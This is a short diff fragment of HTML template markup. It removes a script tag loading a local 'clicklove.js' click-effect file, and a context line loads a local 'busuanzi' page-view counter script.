-    <script src="/libs/others/clicklove.js" async="async"></script>
     
     
     <script async src="/libs/others/busuanzi.pure.mini.js"></script>
